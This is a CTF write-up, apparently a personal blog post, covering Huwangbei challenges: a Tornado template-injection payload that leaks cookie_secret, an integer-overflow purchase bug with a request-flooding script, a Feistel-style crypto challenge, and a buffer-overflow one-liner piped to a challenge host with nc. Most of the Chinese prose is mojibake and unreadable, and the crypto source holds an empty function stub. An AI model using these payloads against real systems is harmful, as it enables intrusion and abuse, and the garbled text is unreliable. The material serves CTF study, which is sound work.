## 0x01 Paper

ã€ŠAutomatic Exploit Generation for Buffer Overflow Vulnerabilitiesã€‹2018 IEEE International Conference on Software Quality

IEEEä¼šè®®çš„æ–‡ç« ä¹Ÿå¯ä»¥è¿™ä¹ˆæ°´ï¼Ÿï¼Ÿï¼Ÿ

AEGå½“ç„¶éƒ½æ˜¯å…ˆæ‰¾æ¼æ´ç„¶ååœ¨exploitï¼Œæ„Ÿè§‰ä¸€èˆ¬éƒ½æ˜¯ç¼“å†²åŒºæº¢å‡ºçš„å¤š
é¢ï¼Œè¿˜æ˜¯å¿ä¸ä½diss

[æœªå®Œå¾…ç»­]

## 0x02 æŠ¤ç½‘æ¯

èœğŸ”

#### 1. web - easy tornado

é¢˜ç›®ç»™äº†ä¸‰ä¸ªé“¾æ¥ï¼š

hint.txt 
md5(cookie_secret + md5(filename))
hint.txt  b71a752e4d5388b9e3ab2dc1aebd8f21 9222bc1559ca9869cf9bd1eb651a9bc8

Orz.txt 
render()
Orz.txt 3ce480777eef4e1a694d678c8deb19fa 1f7f8b9a4759b67b66b9d02cbaaec4e0

flag.txt 
/fllllllllllag  
flag.txt 159df48875627e2f7f66dae584c5e3a5 e978ea3d6b7018e27f762ba225ba338f

ä¿é”™é“¾æ¥ï¼š/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF

msgå­˜åœ¨æ¨¡ç‰ˆæ³¨å…¥ï¼Œç„¶è€Œè¿‡æ»¤äº†`',(,_`ç­‰ï¼Œæƒ³æ‰¾æƒ³`config`è¿™æ ·çš„å…³é”®å­—ï¼Œæœªæœã€‚ã€‚ã€‚æƒ³æƒ³å¦‚æœè¦æ˜¯å…¨éƒ¨åŠŸèƒ½çš„SSTIå°±ä¸ç”¨æ¶‰åŠæç¤ºä¸­çš„md5äº†ï¼Œæ‰€ä»¥å°±æ˜¯è¯»å–é…ç½®æ–‡ä»¶è·å–cookie_secretã€‚ã€‚ã€‚ç„¶åè·‘åäº†åˆ°äº†Pythonæ²™ç›’é€ƒé€¸ï¼Œä¹‹åå¼€å§‹ç¿»tornadoæ–‡æ¡£ï¼Œè¯•äº†è¯•ä¸€äº›å…³é”®å­—ï¼Œç»ˆäºæ‰¾åˆ°äº†

> RequestHandler.settings
> An alias for self.application.settings.

å•Šå˜¿ï½~`http://117.78.26.114:32389/error?msg={{%20handler.settings%20}}`ï¼Œå‡ºæ¥ï½ï½

> Whoops, looks like somethings went wrong . 
> {'login_url': '/login', 'template_path': 'templates', 'xsrf_cookies': True, 'cookie_secret': 's+Ke}?WMqHuoN${fRYjhDS1)k[lxgAwyO&V^_T<d@Up-QC!iGaItP.b3*%E]>#L0', 'debug': False, 'file_path': '/www/static/files', 'static_path': 'static'}

æ¨¡ç‰ˆæ³¨å…¥ç›¸å…³ï¼š

[websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
[server-side-template-injection](https://portswigger.net/blog/server-side-template-injection)


#### 2. web - ltshop

ç¬¬ä¸€æ„Ÿè§‰æ˜¯ç«äº‰ï¼Œç„¶åburpè·‘äº†ä¸€ä¸‹æœ€å¤šè·å¾—8ä¸ªå¤§è¾£æ¡ï¼Œæ¢ä¸äº†å‡ ä¸ªè¾£æ¡ä¹‹ç‹å°±æ›´åˆ«è¯´æ¢flagäº†ã€‚è¦è·‘å‡ åƒä¸‡ä¸ªå¤§è¾£æ¡ï¼Ÿï¼Ÿï¼Ÿ

å—¯ï¼Œç„¶åçœ‹äº†WPã€‚ã€‚ã€‚å…‘æ¢è¾£æ¡ä¹‹ç‹æ—¶æœ‰æº¢å‡ºï¼Œå½“æ—¶åªæ˜¯æµ‹äº†`-1`ï¼Œé¢ç§€é€—äº†ï¼Œä»¥ä¸ºè‡ªå·±æµ‹è¿‡æº¢å‡ºã€‚ã€‚ã€‚

æ˜¯ä¸ªuint64çš„æ•´æ•°ï¼ŒèŒƒå›´0-18446744073709551615ã€‚åå°çš„æ£€æµ‹åº”è¯¥æ˜¯"5*å…‘æ¢çš„æ•°é‡?<å·²æœ‰"ï¼Œæ‰€ä»¥å…‘æ¢æ•°é‡ä¸º3689348814741910324æ—¶ï¼Œå‘ç”Ÿæº¢å‡ºï¼ŒæˆåŠŸå…‘æ¢ï¼Œä¹Ÿå°±æœ‰ä¸ªå…‘æ¢flagçš„è¾£æ¡ä¹‹ç‹ã€‚

é™„ä¸€ä¸ªå¤šçº¿ç¨‹çš„ä»£ç ï¼š

```python

import multiprocessing
from requests.exceptions import RequestException
from requests.adapters import HTTPAdapter
import re, os, json, requests, time
import traceback

def main():
    url = 'http://117.78.26.114:30805/buylt'
    cookie = 'b7bc3d53-1291-420c-8745-0075fbebda2c'
    headers = {'Cookie':'go_iris_cookie='+ cookie}
    k = requests.post(url,headers=headers)
    print k.content

if __name__ == '__main__':
    results = []
    pool = multiprocessing.Pool(processes=20)
    for i in range(0xff):
        results.append(pool.apply_async(main,))
    pool.close()
    pool.join()
```

#### 3. crypto - FEZ

æºç ï¼š

```python
import os
def xor(a,b):
    assert len(a)==len(b)
    c=""
    for i in range(len(a)):
        c+=chr(ord(a[i])^ord(b[i]))
    return c
def f(x,k):
    return xor(xor(x,k),7)
def round(M,K):
    L=M[0:27]
    R=M[27:54]
    new_l=R
    new_r=xor(xor(R,L),K)
    return new_l+new_r

def unround(M, K):

def fez(m,K):
    for i in K:
        m=round(m,i)
    return m

K=[]
for i in range(7):
    K.append(os.urandom(27))
print K
m=open("flag","rb").read()
assert len(m)<54
m+=os.urandom(54-len(m))

test=os.urandom(54)
#test = "0b7361c8143e5935f9f5be3949cc07ed7a5ba6f258ebd91f29c5a7d16976f8dfb7fa422a6167281e573d015cc6d995841d5cab07923c".decode("hex")
print test.encode("hex")
print fez(test,K).encode("hex")
print fez(m,K).encode("hex")

```

æ‰‹åŠ¨ç®—ä¸€ç®—ï¼ŒåŠ å¯†æµç¨‹å°±æ˜¯ç©¿è¿›54ä½ï¼Œå‰27ä½ä¸ºAï¼Œå27ä½ä¸ºBï¼Œæœ€åç”Ÿæˆæ–°çš„54ä½ï¼Œå‰27ä½æ˜¯A^Xï¼Œå27ä½æ˜¯A^B^Yï¼Œå…¶ä¸­XYæ˜¯Kä¸­å‡ é¡¹çš„è¿ç®—ç»“æœï¼Œå¯ä»¥æ¨å‡ºXYçš„å€¼ï¼Œç„¶åå°±å¯ä»¥å¾—åˆ°ç»“æœã€‚ã€‚ã€‚

#### 3. Pwn - gettingstart

é¢å‘µï¼Ÿæˆ‘æ˜¯äºŒè¿›åˆ¶é€‰æ‰‹ï¼Ÿï¼Ÿï¼Ÿåªæ°´äº†ä¸€é“æœ€ç®€å•çš„ã€‚å…¶ä¸­åˆä¸€ä¸ªåˆ¤æ–­å˜é‡æ˜¯å¦ç­‰äº0.1ï¼Œä¹‹åè‡ªå·±æ‰‹åŠ¨å†™äº†ä¸€ä¸ªåæ±‡ç¼–çœ‹ä¸€ä¸‹æ•°æ®çš„è¡¨ç¤ºã€‚

```python
(python -c "print 'A' * 24 + '\xff\xff\xff\xff\xff\xff\xff\x7f' + '\x9a\x99\x99\x99\x99\x99\xb9\x3f'";cat -) | nc 117.78.26.19 30838
```

